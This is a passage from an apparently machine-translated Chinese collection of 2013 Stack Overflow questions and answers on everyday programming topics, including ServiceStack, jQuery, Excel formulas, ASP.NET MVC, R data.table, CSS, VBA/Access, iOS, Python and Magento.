nvm alias default 0.9 
```

并安装了 qunit

```
npm install -g qunit 
```

最后我不得不在 .bashrc 中添加它：

```
export NODE_PATH=~/.nvm/v0.9.2/lib/node_modules 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-22T18:00:05.667

你还没有导入 jQuery：

`$ = require('jquery'), jQuery = require('jquery');`

如果您使用的是 browserify，请将其更改为“jquery-browserify”。

# servicestack - 在 servicestack 模型中包含图像

> ID：16110031
> 
> 赞同：1
> 
> 时间：2013-04-19T17:10:31.863
> 
> 标签：servicestack

我正在寻找一种将图像包含到服务堆栈模型中的好策略（如果可能的话）。我已经搜索了示例或提示，但运气不佳。

就像是

```
class House
{
    string Address;
    //Image could be anything as long as it can be returned and viewed as a picture in a  
      browser.     
    Image Picture;
} 
```

这可以作为响应的一部分返回并正确显示吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T17:43:57.920

将二进制 blob 数据直接包含在 DTO 有效负载中很少是一个好主意。

### 发送二进制格式的二进制数据

唯一有意义的格式是使用二进制格式，如[ServiceStack](http://www.servicestack.net)对[ProtoBuf](https://github.com/ServiceStack/ServiceStack/wiki/Protobuf-format)或[Message Pack](https://github.com/ServiceStack/ServiceStack/wiki/MessagePack-Format)格式的支持，它们不会因编码二进制数据而受到惩罚。在这种情况下，您会将图像序列化为`byte[]`DTO 上的属性。如果您尝试以文本格式执行此操作，则需要使用类似 Base64 的格式对二进制数据进行编码，从而不必要地使有效负载膨胀并增加计算开销。

### 将 url 嵌入到图像或二进制文件中

推荐的方法不是直接在 DTO 中嵌入图像，而是只包含一个引用图像的 Url。ServiceStack 非常支持返回原始二进制或文本数据，您可以简单地返回任何`byte[]`, `Image`, `Stream`, `IStreamWriter`, raw`strings`等，它会按预期序列化它们。

### ServiceStack 对原始二进制或文本响应的支持

一个很好的例子可以在新的 Image Resizer [imgur.servicestack.net](http://imgur.servicestack.net)或[RestFiles](https://github.com/ServiceStack/ServiceStack.Examples/blob/master/src/RestFiles/RestFiles.ServiceInterface/FilesService.cs)示例演示中看到。

以下是有关 wiki 上自定义 HTTP 响应的更多信息：

*   [返回任何响应](https://github.com/ServiceStack/ServiceStack/wiki/Service-return-types)
*   [自定义 HTTP 响应](https://github.com/ServiceStack/ServiceStack/wiki/Customize-HTTP-Responses)
*   [使用类型化服务客户端使用原始数据](https://github.com/ServiceStack/ServiceStack/wiki/C%23-client#support-for-native-built-in-response-types)
*   [使用内置 HTTP 实用程序使用来自 3rd 方 API 的原始数据](https://github.com/ServiceStack/ServiceStack/wiki/Http-Utils)

# c# - 创建类似于谷歌地图左侧导航的滑动面板

> ID：16110036
> 
> 赞同：-4
> 
> 时间：2013-04-19T17:10:52.840
> 
> 标签：c#, jquery, asp.net, html, visual-studio-2010

我需要编写一个看起来与谷歌地图一模一样的左侧面板 ![在此处输入图像描述](https://i.stack.imgur.com/woC7s.jpg)

例如，当我按下箭头时，它将最小化左侧面板。

![在此处输入图像描述](https://i.stack.imgur.com/0WAla.jpg)

因此，当我单击箭头时，它会再次出现，并且我的内容将向右移动。

有什么帮助吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T17:19:02.600

这真的很容易实现。当然我的实现会很丑，但你只需要改变css。完整代码在这里：http: [//jsfiddle.net/YDukt/](http://jsfiddle.net/YDukt/) HTML 如下所示：

```
<div id='leftSide'>
    Something here from google
</div>
<div id='click'>
    >
</div> 
```

Javascript：

```
$('#click').click(function()
{
    $("#leftSide").animate({width:'toggle'},500);       
}); 
```

还有丑陋的CSS：

```
#leftSide
{
     height: 500px;
     width: 200px;
     background: black;
     float: left;
     display: none;    
     color: white;
     font-size: xx-large;
}
#click
{
     height: 25px;
     width: 25px;
     background: aqua;
     float: left; 
     margin-top: 20px;
} 
```

# javascript - 在 IE 兼容模式下支持自定义元素

> ID：16110040
> 
> 赞同：1
> 
> 时间：2013-04-19T17:11:07.417
> 
> 标签：javascript, jquery, internet-explorer, dom, ie8-compatibility-mode

在 Chrome 和 IE（不兼容）中，自定义标签在检查和导航 DOM 时可以正常工作。

在IE+兼容模式下，它不起作用。

这是 jsbin 中的一些示例代码：http: [//jsbin.com/ozajeh/1/edit](http://jsbin.com/ozajeh/1/edit)

```
<html>
  <!--  Run this in IE 8/9, possibly 10, with compatibility mode on to see the issue -->
<head>
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
    <script>
        if (document.createElement) {
            document.createElement("myelement");
        }
    </script>
</head>
<body>
    <script>
        var div = $("<div>content</div>");
        if( div.contents().length > 0 && div[0].childNodes.length > 0){
            alert("found content in div");
        }

        var myElement = $("<myelement>content</myelement>");
        if (myElement.contents().length > 0 && myElement[0].childNodes.length > 0) {
            alert("found content in myelement");
        }else{
          alert("IE issue: cannot find content in myelement");
        }
    </script>
</body>
</html> 
```

如何让 Internet Explorer 在兼容模式下正确处理标签？

当前发生的情况是 myElement.nextSibling() 返回文本节点，这显然是不正确的。

我可以根据属性/值测试找出解决方法，但是有没有更可靠的方法来处理这种情况？

# excel - 从一列复制到另一列，整列复制到特定文本

> ID：16110041
> 
> 赞同：-1
> 
> 时间：2013-04-19T17:11:10.353
> 
> 标签：excel, replace, ms-office, vba

我知道这有点困难，但我想知道是否有人可以提供帮助。我想将一整列数据复制到另一列，但是当我们复制数据时，它应该只替换该列中的一个特定单词，而不是整个内容。

例如

```
Column A    
1234        
5252         
3265         
999        

Column B

This is **

This is **

This is **

This is ** 
```

我想将 A 列数据替换为 B 列数据，但它应该只替换 ** ，因此 A 列中的任何内容都将被 B 列中的 ** 替换，但它不应更改 B 列中的任何其他文本

我想知道是否有人可以解决这个问题？excel里面有宏吗？它只是一个查找和替换宏，但更复杂

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T17:40:14.853

虽然这当然可以在 VBA 中完成，但为什么不直接使用 SUBSTITUTE 公式呢？然后，您可以执行复制/粘贴特殊以将公式转换为值。例如，单元格 C2 中的公式为`=SUBSTITUTE(B2,"****",A2)`.

![在此处输入图像描述](https://i.stack.imgur.com/QRehQ.png)

# asp.net-mvc - MVC4 - DisplayMode 与 Areas 用于创建内部业务应用程序的客户端门户

> ID：16110042
> 
> 赞同：1
> 
> 时间：2013-04-19T17:11:16.103
> 
> 标签：asp.net-mvc, security, dry, asp.net-mvc-areas, separation-of-concerns

我有一个 MVC 应用程序，旨在供公司内部使用（但设计时知道最终我们将为客户提供访问权限），该应用程序目前通过互联网 (ssl) 提供服务。我们现在正在考虑为客户提供对其及其帐户的访问权限。个人资料编辑，程序注册，当前服务的状态，非常典型的东西。但我在如何去做这件事上犹豫不决。一定有一些公共访问所独有的东西不适用于公司员工，但我希望尽可能保持 DRY，并尝试保持现有代码的精简。我想出了两个选项，我正在寻找我可能会丢失的意见和见解。我是否犯了任何设计失误来娱乐这个，或者我错过了另一个选择？

* * *

**MVC4 显示模式**

MVC4 提供了（通过 DisplayModes）根据自定义标准提供替代视图的能力。默认实现基于 AgentString，用于为移动设备（平板电脑、手机）提供备用视图。但我已经对其进行了测试，它还可以用于根据其他标准提供替代视图，例如用户信息（处于特定角色）。我想我可以在系统中添加一个公共客户帐户独有的角色，如果定制是主要的，这将导致他们获得备用视图，如果不是，让它回退到使用默认视图，如果定制确实如此不需要全新的观点。他们的其余访问权限将尽可能使用现有权限、角色和安全限制进行处理。我看到的缺点是控制器操作对于员工和公共客户来说都是相同的，因此根据用户是员工还是公共客户，不同的代码路径可能会变得有点混乱。更不用说无意中暴露仅适用于员工的东西的可能性。但它也会使观点非常干燥。

*全球.asax*

```
var displayModes = DisplayModeProvider.Instance.Modes;
displayModes.Insert(0, new DefaultDisplayMode("Client")
    {
        ContextCondition = (context => context.User.Identity.IsAuthenticated && context.User.IsInRole("Client"))
    }); 
```

* * *

**MVC 领域**

MVC 还提供了使用区域作为在同一站点内提供应用程序部分分离的一种方式的能力。因此，我可以创建一个名为 Portal 的区域，例如作为网站/应用程序的客户端门户。使用这种方法，我应该能够从用于站点主要部分的控制器继承，并在客户端门户需要不同逻辑时根据需要覆盖某些操作，并让其余部分落入基类（我没有还没有测试过这个理论，但我假设它会起作用？）。我认为这会导致 DRY 控制器，但对于视图来说并没有那么多，因为我必须从主站点复制我需要的任何视图，即使它们不需要任何更改。下面的代码有点做作，但我认为它明白了这一点。

```
namespace MyCompany.Web.Areas.Portal

public class ClientInvoicesController : MyCompany.Web.InvoicesController
{
    public new ActionResult List()
    {
        var clientId = invoiceService.GetCurrentCLientId();
        var invoices = invoiceService.GetInvoices(clientId);
        return View(invoices.Where(x=>x.HideFromClient != true).ToList());
    } 
} 
```

* * *

有没有其他人看过类似的东西？在我对我的思考过程获得第二意见之前，我不想在一条或另一条道路上走得太远，因此您可以提供的任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T17:51:56.060

您是否认为可以使用区域方法（我认为它对您的项目更好）结合部分观点来获得两个领域相同的观点？

这允许您解耦应用程序的两个部分，但您可以重用视图并利用控制器的继承。

# api - Mechanical Turk - 通过 API 获取批次的结果

> ID：16110048
> 
> 赞同：7
> 
> 时间：2013-04-19T17:11:45.467
> 
> 标签：api, amazon-web-services, mechanicalturk

我们使用 Mechanical Turk Web 界面创建了一批 HIT。现在我们要做的就是使用 API 下载批次的结果，就像您可以使用“下载 CSV”在 Web 界面中下载批次的结果一样。

来自亚马逊的文档说从 API 下载结果是可能的，如果不是，我会感到惊讶。但是经过大量的编程和测试后，我无法获得批处理的结果。

[http://docs.aws.amazon.com/AWSMechTurk/latest/AWSMturkAPI/ApiReference_OperationsArticle.html](http://docs.aws.amazon.com/AWSMechTurk/latest/AWSMturkAPI/ApiReference_OperationsArticle.html)

我们的问题不是获取 HIT 数据，使用`GetHIT`. 我们的问题也不在于获取分配数据，这很容易用`GetAssignmentsForHIT`. 我们的问题是找出一个批次的 HIT ID，以便我们只获取该批次的结果。

我们认为我们可以做到这一点，`GetHITsForQualificationType`但由于我们对所有批次使用相同的 HIT 类型 ID，这是不可能的。我能看到的唯一其他操作是 SearchHITs，但此操作仅允许您“排序”值而不是“过滤”例如批次 ID。

如果亚马逊是一家 SOA 公司并且他们遵循“吃你自己的狗粮”的概念，那么我想知道他们如何使用他们的 API 在“下载 CSV”中生成结果？

任何提示将不胜感激。谢谢！

**更新#1**

我相信你可以`SearchHITs`用来拉出*所有*的命中。然后使用 . 获取每个 HIT 的详细信息`GetHIT`。然后通过“RequesterAnnotation”过滤所有HIT，其中实际包含批次ID，例如“BatchId:1234567;”。这可能是唯一的解决方案。不过听起来有点牵强。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-02T09:56:19.477

工作流程与您在更新 #1 中描述的完全相同：(1)`SearchHITs`用于获取所有 HIT。(2) 获取详细信息（您实际上可以跳过此步骤，因为如果您包含响应组，则会`GetHIT`附带“请求者注释”字段）。(3) 通过注解字段过滤结果，得到你想要的HIT。(4)用于检索作业。`SearchHITs``HITDetail``GetAssignmentsForHIT`

“批次 id”似乎只有 Amazon 可以访问以在请求者用户界面上使用。（请参阅[MTurk 开发者论坛上的](https://forums.aws.amazon.com/thread.jspa?messageID=422027&#422027)一些讨论）

而且，当然，API 会以 XML 格式为您提供结果，您需要对其进行解析以将它们转换为 CSV。

# ruby-on-rails-3 - rails 3.0.3 - 为什么创建了这么多没有用户 ID 的会话？

> ID：16110049
> 
> 赞同：0
> 
> 时间：2013-04-19T17:11:45.933
> 
> 标签：ruby-on-rails-3, session, nginx

在我的 rails 3.0.3 上，我看到每隔几秒创建一次会话，没有用户 ID。

rails 3.0.3 nginx 与乘客

我已经使用 db:session:clean 清理了会话，并继续创建新会话。

为什么会创建这么多会话？

# r - 按 POSIXct 因子拆分 data.table（或框架）

> ID：16110057
> 
> 赞同：1
> 
> 时间：2013-04-19T17:12:22.843
> 
> 标签：r, split, dataframe, data.table, posixct

我正在尝试按列拆分`data.table`（增强的`data.frame`）`POSIXct`，但没有成功...

```
rangedt <- as.POSIXct(c("2012-10-01 06:00","2012-10-01 21:00"), tz='GMT'); N=1e2
dts <- as.POSIXct(runif(n=N, min=min(rangedt), max=max(rangedt)), tz='GMT', origin='1970-01-01')
DT <- data.table(x=rnorm(N), dts=dts) # put data.frame if you prefer
#                          x                        dts
#1:  0.938973900218328494383 2012-10-01 17:11:46.503828
#2:  0.582959687387282210480 2012-10-01 17:33:24.203815
#3: -1.492752410394331263888 2012-10-01 08:37:37.585960
#4:  0.677074458537853418605 2012-10-01 08:55:04.598939
#5:  0.012120685348577473275 2012-10-01 09:35:16.664197
#6: -1.353204371844073161668 2012-10-01 18:45:46.737178 
f <- cut(rangedt, breaks='10 min');
f
#[1] 2012-10-01 06:00:00 2012-10-01 21:00:00
#91 Levels: 2012-10-01 06:00:00 2012-10-01 06:10:00 2012-10-01 06:20:00

DT.split <- split(DT, f=findInterval(DT$dts,f))

length(DT.split)
#[1] This is because R make one class only fron the data, which I do not understand 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T18:28:29.477

我在这里发现了问题，因素和 POSIXct 不能很好地协同工作

```
rangedt <- as.POSIXct(c("2012-10-01 06:00","2012-10-01 21:00"), tz='GMT'); N=1e2
dts <- as.POSIXct(runif(n=N, min=min(rangedt), max=max(rangedt)), tz='GMT', origin='1970-01-01')
DT <- data.table(x=rnorm(N), dts=dts) # put data.frame if you prefer
#                          x                        dts
#1:  0.938973900218328494383 2012-10-01 17:11:46.503828
#2:  0.582959687387282210480 2012-10-01 17:33:24.203815
#3: -1.492752410394331263888 2012-10-01 08:37:37.585960
#4:  0.677074458537853418605 2012-10-01 08:55:04.598939
#5:  0.012120685348577473275 2012-10-01 09:35:16.664197
#6: -1.353204371844073161668 2012-10-01 18:45:46.737178 
f <- cut(rangedt, breaks='10 min');
f
#[1] 2012-10-01 06:00:00 2012-10-01 21:00:00
#91 Levels: 2012-10-01 06:00:00 2012-10-01 06:10:00 2012-10-01 06:20:00
f <- as.POSIXct(levels(f), tz='GMT', origin='1970-01-01')
DT[, groups:=findInterval(dts,f)]
DT.split <- split(DT, DT$groups) 
```

# html - 正文重叠固定，水平导航栏顶部 - CSS/HTML

> ID：16110064
> 
> 赞同：0
> 
> 时间：2013-04-19T17:12:55.767
> 
> 标签：html, css, overlap, nav

我必须为一项任务建立一个网站，我遇到了一些麻烦。我在顶部创建了一个导航栏，它位于固定位置。但是，当我滚动时，一切都会通过它显示出来。我想要的，本质上是让网页在导航栏下开始，所以它在顶部，当我点击“关于我”时，它在导航栏下没有标题，就像在第二张图片中一样。

[http://i.imgur.com/oTkXlWx.png](http://i.imgur.com/oTkXlWx.png)

有谁知道如何做到这一点？谢谢。

```
#top-bar
    {   
        border-top:#fff dashed 1px;
        width:100%;
        height:32px;
        background:black;
        opacity:0.8;
        text-align:center;
        position:fixed;
        top:0;
        padding-bottom:12px;

    }

#top-nav li
{
    display: inline-block;
    line-height: 49px;
    padding: 0px 14px;

}

#top-nav li a
{
    display:block;
    color: #ddd;
    font-weight: 700;
    letter-spacing: 0.08em;
    text-decoration: none;
    text-transform: uppercase;
}

#top-nav li:hover, #top-nav li:hover a
{
    background-color:#333;
    color:#fff;
} 
```

和html：

```
 <nav id="top-bar">
        <ul id="top-nav">
            <li>
                <a href="#about-text">About Me</a>
            </li>

            <li>
                <a href="#programming-text">Programming</a>
            </li>

            <li>
                <a href="#home-text">Hometown</a>
            </li>

            <li>
                <a href="#swinburne-text">Swinburne</a>
            </li>

            <li>
                <a href="#achievement-text">Acheivements</a>
            </li>
        </ul>
    </nav> 
```

基本上，我不希望网页“滚动浏览”导航栏。另外，我的班级还没有完成 javascript，所以如果有一个不使用 javascript 的解决方案，那就太好了。

多谢你们。

PS 这是关于 div 的代码：

```
<div id="about-text" class="box">
    <h3>About Me</h3> 
    <p>My name is   , I'm 18 years old, and a Computer
    Science student at Swinburne University of Technology, Hawthorn.
    I've always been interested in computers, there is something
    beautiful about technology working to do so many things the human
    brain cannot possibly do.</p>
</div> 
```

和CSS：

```
#about-text, #programming-text, #home-text, #achievement-text
{

    border-style : solid;
    border-width:0.2em;
    opacity:0.5;
    width : 70%;    
    transition: opacity 0.2s;
    -webkit-transition: opacity 0.2s;

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T17:23:40.143

我相信你只需要给`.box`es 足够的 a`margin-top`来清除固定的导航栏。

**更新：**

发现问题的根本原因是使用了页内链接，单击时总是向右滚动到视口顶部（在固定导航下）。

最好的解决方案最终是`a`在每个元素之前添加空元素`div.box`以用作链接的目标，并为它们提供足够大的大小以使它们`.box`能够落入导航栏下方：

```
<a href="#about-text" class="button"></a>
<div class="box"> ... </div>

.button {
    display: block;
    padding: 25px;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-11-06T21:33:53.463

您可以使用的一个技巧是放在标签`nav`内`header`并为标题提供背景颜色，白色或您使用的任何颜色。向下滚动将在导航栏下方，但由于与它重叠的背景颜色，它不会被看到。

# asp.net-mvc - Kendo UI Grid - 不会显示继承的列

> ID：16110065
> 
> 赞同：2
> 
> 时间：2013-04-19T17:12:56.063
> 
> 标签：asp.net-mvc, grid, kendo-ui

对于我所有的模型实体，我继承了一个基类，但是当我尝试将继承的字段之一放在网格上时，它只是不显示它们。我的解决方法是在派生类上创建一个包装器属性，现在网格显示该列。

前任：

```
public class BaseEntity
{
    public Guid RowId  { get; set; }
    public bool Deprecated { get; set; }
    public bool Deleted { get; set; }<br/>
    public DateTime DateTimeStamp { get; set; }
}

public class Foo : BaseEntity
{
    public int FooId { get; set; }
    public string Description{ get; set; }
} 
```

和网格设置

```
@(Html.Kendo().Grid<Foo>()
.Name("Grid")
.Columns(cols =>
{
    cols.Bound(c => c.FooId);
    cols.Bound(c => c.Description);
    cols.Bound(c => c.DateTimeStamp).Format("{0:yyyy-MM-dd HH:mm}").Title("Date/Time").Sortable(false);
.Pageable()
.Sortable() 
```

)

为了使其工作，我必须添加一个引用基类属性的属性，如下所示：

```
public class Foo : BaseEntity
{
    public int FooId { get; set; }
    public string Description{ get; set; }
    public new DateTime DateTimeStamp
    {
        get { return base.DateTimeStamp; }
        set { base.DateTimeStamp = value; }
    }
} 
```

有什么方法可以避免在派生类上使用 wrapper 属性？

谢谢

# ruby - 搜索字符串 minitest 的命令输出

> ID：16110072
> 
> 赞同：0
> 
> 时间：2013-04-19T17:13:49.723
> 
> 标签：ruby, chef-infra, minitest

我正在尝试为厨师（minitest::spec）创建一个迷你测试，但我对如何在 ruby​​ 中完成我想要的有点迷茫。

我想要做的是让代码运行“日期”命令，然后检查输出是否包含“UTC”。

到目前为止我有这个，但我不知道如何检查输出是否为“真”：

```
it "uses the correct timezone" do
    timezone_check = shell_out("date")
    timezone_check.to_s.include?('UTC')
end 
```

我尝试使用 .must_output，但我不知道如何合并它。这甚至是实现我想要的最佳方式吗？

任何输入表示赞赏！

谢谢。

编辑：我现在已经试过了：

```
 it "uses the correct timezone" do
    date_input = `date`
    proc { puts date_input.to_s }.must_output /UTC/
  end 
```

但这会导致：

```
Failure:
test_0002_uses_the_correct_timezone(recipe::base::default) [/var/chef/minitest/base/default_test.rb:18]:
In stdout.
--- expected
+++ actual
@@ -1 +1,2 @@
-/UTC/
+"Fri Apr 19 17:50:27 UTC 2013
+" 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T17:33:46.297

将其包装在 proc 中并尝试使用[`must_output`](http://bfts.rubyforge.org/minitest/MiniTest/Expectations.html#method-i-must_output). 测试可能看起来像：

```
it "uses the correct timezone" do
    proc { timezone_check = shell_out("date") }.should_output /UTC/
end 
```

从文档中不能完全确定该`should_output`方法将接受模式，但如果您可以编写测试以准确了解预期的整个输出，那么您可以简单地测试完整的预期字符串。例如

```
it "uses the correct timezone" do
    proc { timezone_check = shell_out("date") }.should_output("Fri Apr 19 12:33:13 CDT 2013")
end 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T17:49:59.860

测试`shell_out`要求您针对`stdout`

```
it "uses the correct timezone" do
  timezone_check = shell_out("date")
  timezone_check.stdout.must_match /UTC/
end 
```

有关更多示例，请查看[Cookbook 集成测试](http://jtimberman.housepub.org/blog/2012/12/13/cookbook-integration-testing-with-real-examples/)

# excel - 无法使用 ADO 连接到 Access 数据库

> ID：16110074
> 
> 赞同：0
> 
> 时间：2013-04-19T17:13:57.023
> 
> 标签：excel, ms-access, vba, ado

我需要将存储在 .txt 文件中的一堆表导入 Access 数据库。完成导入后，我使用 ADO 连接在数据库和 Excel 工作簿之间进行通信。我将 Access 数据库设置为压缩并在关闭时修复。

问题是，当我在导入文件后关闭数据库时，我无法在不等待任意时间的情况下使用 ADO 进行连接。当我尝试连接但失败时，访问窗口似乎已关闭。我发现我必须等待的时间与导入后数据库的大小有关。导入最大的文件集后，即使等待 60 秒也不够。

有什么方法可以强制打开连接吗？如果失败了，我怎么能检查它是否准备好连接？

这是我正在使用的一些代码：

```
MDB_Address = "C:\example.mdb" 
Shell "cmd /c " & Chr(34) & MDB_Address & Chr(34), vbHide
'Some code that tests if it has opened happens here
 ...

Set ObjAccess = GetObject("C:\example.mdb")

' Import tables here

ObjAccess.Quit

Call CloseAccess
Call Wait

mdbPath = "C:\example.mdb"
Set mdbConnection = CreateObject("ADODB.Connection")
' The line below gives a run time error. The description is "Automation error Unspecified Error"
mdbConnection.Open "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & mdbPath

Sub CloseAccess
' I have set up the access database to write a flag to a .txt file when a
   userform closes and use this to help check if it has closed.
End Sub

Sub Wait
' Wait 5 seconds. The access window appears to be closed.
Dim nHour As Date, nMinute As Date, nSecond As Date, waitTime As Date

nHour = Hour(Now())
nMinute = Minute(Now())
nSecond = Second(Now()) + 5
waitTime = TimeSerial(nHour, nMinute, nSecond)
Application.Wait waitTime
End Sub 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-29T02:40:31.580

这是我最终测试数据库是否关闭的方法。我使用 Windows API 函数来获取 Access 数据库的进程句柄，然后获取其退出状态。

这似乎工作得很好。当然还有其他方法可以实现这一点 - 我认为在目录中创建了一个 ldb 文件，它可能会检查它的存在。

```
Private Declare Function OpenProcess Lib "kernel32" _
    (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long

Private Declare Function GetExitCodeProcess Lib "kernel32" _
    (ByVal hProcess As Long, lpExitCode As Long) As Long

'Open the data base
TaskID = Shell("cmd /c " & Chr(34) & MDB_Address & Chr(34), vbHide)
ACCESS_TYPE = &H400
hProc = OpenProcess(ACCESS_TYPE, False, TaskID)

'Some code that tests if it has opened happens here
 ...

Set ObjAccess = GetObject("C:\example.mdb")

' Import tables here

ObjAccess.Quit

Call CloseAccess

Sub CloseAccess()

    Dim test As Long

    'Test if the database has closed

    Do Until lExitCode <> 259 And test <> 0
        test = GetExitCodeProcess(hProc, lExitCode)
        DoEvents
    Loop

End Sub 
```

# iphone - ios：改变方向后UIView的宽高不准确？

> ID：16110076
> 
> 赞同：1
> 
> 时间：2013-04-19T17:14:04.993
> 
> 标签：iphone, ios, objective-c, uiview, orientation-changes

我试图确保我的自定义`UIView`始终位于屏幕中央，即使在方向更改后也是如此。

所以我试图用我`UIView`的超级视图做一些数学运算，这是我程序的主视图（所以它占据了整个屏幕）。

我注意到在方向改变后打印出超级视图框架的宽度和高度时，它的宽度和高度在第一次旋转后没有改变，那么这不是我之后所期望的。

出乎意料的是，当设备处于纵向模式时，宽度 = 480 和高度 = 320。当设备处于横向模式时，宽度 = 320 和高度 = 480。

我从以下渠道获得这些数字：

```
CGRect sFrame = [self superview].frame;
NSLog(@"width = %f, height = %f", sFrame.size.width, sFrame.size.height); 
```

这是在我的自定义 UIView 中。

超级视图的框架不会自动更新吗？如果没有，我应该在哪里获得准确的宽度和高度？有一个更好的方法吗？

非常感谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-19T17:20:46.607

使用`autoresizingMask`

```
view.center = view.superview.center;
view.autoresizingMask = UIViewAutoresizingFlexibleLeftMargin | UIViewAutoresizingFlexibleRightMargin |  UIViewAutoresizingFlexibleTopMargin | UIViewAutoresizingFlexibleBottomMargin; 
```

那么您不必再编写任何代码

# python - Python 错误：“finalStore”对象没有属性“名称”

> ID：16110077
> 
> 赞同：0
> 
> 时间：2013-04-19T17:14:17.900
> 
> 标签：python, class, inheritance

我正在使用 python 中的继承，但我遇到了一个错误，我不知道如何修复，'finalStore' 对象没有属性'marone'。当我尝试创建一个对象时，我得到了这个。

```
from ClassFile import studStore

class finalStore (studStore):

    grandAve = 0
    numStu = 0

    def __init__(self, name, marone, martwo, marthree, marfour, corone, cortwo, corthree, corfour):
        studStore.__init__(self, name, marone, martwo, marthree, marfour)
        self.corone = corone
        self.cortwo = cortwo
        self.corthree = corthree
        self.corfour = corfour
        finalStore.numStu += 1
        self.holder = finalStore.numStu
        self.average = (marone + martwo + marthree + marfour)/4
        finalStore.grandAve += self.average
        self.storit = finalStore.grandAve 
```

我为子类初始化

```
class studStore:

    def __init__(self, name, marone, martwo, marthree, marfour):
        self.newname = name
        self.Ave = 0
        self.marone = marone
        self.martwo = martwo
        self.marthree = marthree
        self.marfour = marfour 
```

以及父类的初始化。我的主线只是一个循环，我在其中创建了多个对象，但在这一行出错：

```
listIn.append(finalStore(name, gradeone, gradetwo, gradethree, gradefour, courseOne, courseTwo, courseThree, courseFour)) 
```

我不确定错误是什么，但我有一个类似的程序可以工作，我只是没有使用 from * import *

我这样输出

```
for i in range (0,len(listIn)):
    print(str(listIn[i].returnName()).ljust(20," "), end = " ")
    print(str(listIn[i].returnOne()).ljust(20, " "))
    print(str(listIn[i].returnTwo()).ljust(20, " "))
    print(str(listIn[i].returnThree()).ljust(20, " "))
    print(str(listIn[i].returnFour()).ljust(20, " ")) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T18:02:23.217

您对超类的 init 函数的调用不正确。这是您应该如何做的：

```
class finalStore(studStore):

    def __init__(self, name, ...):
        super(finalStore, self).__init__(name, marone, ...) 
```

# sql-server - SQL Server Express 几乎每 20 分钟需要重新启动一次

> ID：16110078
> 
> 赞同：-1
> 
> 时间：2013-04-19T17:14:17.943
> 
> 标签：sql-server, database, sql-server-express

我承认是 SQL Server 的新手。我最近在一台机器上安装了 SQL Server Express，并且正在开发（和测试）代码以从另一台机器连接到它。但是在我启动数据库后，SQL Server Express 会在 15 分钟左右进入睡眠状态。自然不会访问那台机器，比如 mc1，（其中安装了 DB），因为我正在另一台机器上工作，比如 mc2。我尝试在 SQL Server DB 上将 AUTO_CLOSE 设置为 OFF。命令执行成功。但是，数据库仍然进入睡眠状态。还有什么我可以尝试的吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T16:41:47.427

在我重新启动安装了数据库的服务器机器后，它现在工作正常。看起来像 AUTO_CLOSE = OFF 设​​置必须跟随机器重启，至少在我的情况下。

# magento - Magento：Mage::getModel('catalog/category') 使用 EAV 还是平面数据？

> ID：16110080
> 
> 赞同：3
> 
> 时间：2013-04-19T17:14:27.567
> 
> 标签：magento

当您调用`Mage::getModel('catalog/category')`or时，是从平面数据还是表格`Mage::getModel('catalog/product')`中加载？`_entity`

管理员中有一个选项可以让您“使用平面”数据，我想知道这是否与`::getModel()`通话有关。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T17:55:43.493

The `catalog/category` model is an EAV model. In a default Magento configuration, its data is stored in

```
catalog_category_entity
catalog_category_entity_datetime
catalog_category_entity_decimal
catalog_category_entity_int
catalog_category_entity_text
catalog_category_entity_varchar 
```

The `catalog/category` model also has a "flat catalog" feature in `System -> Configuration -> Catalog -> Use Flat Catalog Category`. With this enabled the `catalog/category` model will pull data from one of the flat categories

```
catalog_category_flat_store_* 
```

Either way, you can use the `catalog/category` collection object to query this data any way you see fit, including the `addAttributeToFilter` method.

```
$collection = Mage::getModel('catalog/category')
    ->getCollection()
    ->addAttributeToSelect('*');

$collection->addAttributeToFilter(
    'url_path', array('like' => 'apparel%')
);

foreach($collection as $item)
{
    var_dump($item->getData());
} 
```

# vb.net - Visual Basic 2010 没有发布选项？

> ID：16110083
> 
> 赞同：-1
> 
> 时间：2013-04-19T17:14:30.813
> 
> 标签：vb.net, visual-studio-2010

[http://i.imgur.com/CZ77Cje.png](http://i.imgur.com/CZ77Cje.png)

我启用了专家设置，但我无法更改构建模式。我在项目属性中也没有更改构建模式的选项。我需要更改才能发布。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T17:36:29.590

我相信 Visual Basic 项目始终默认为 Release（假设它们是解决方案中创建的第一个项目），因此 VB 配置文件设置不显示配置管理器下拉菜单。但是，您可以通过以下方式查看设置：

*   如果默认情况下未显示解决方案配置下拉菜单，则将其添加到工具栏。您可以通过展开“添加”或“删除”按钮来做到这一点。
*   通过转到工具-> 自定义手动添加它。从那里：

    1.  切换到命令选项卡
    2.  选择工具栏 = 标准
    3.  单击添加命令。
    4.  选择“构建”类别。
    5.  找到底部的解决方案配置下拉菜单，然后添加它。

（免责声明：我手边没有 VS2010，但这些步骤应该是一样的）

# sql-server-2005 - IIS 运行查询的时间比 SMSS 长

> ID：16110084
> 
> 赞同：0
> 
> 时间：2013-04-19T17:14:35.150
> 
> 标签：sql-server-2005, iis

我完全被这个难住了。我们在这里运行一个非常普通的 Intranet 应用程序，经典的 ASP 前端和 SQL Server 2005 后端。有时，每周一次/两次，当我在 Management Studio 中运行某个存储过程时，它的运行时间要长约 50 倍。这种缓慢持续了一整天，第二天莫名其妙地消失了。

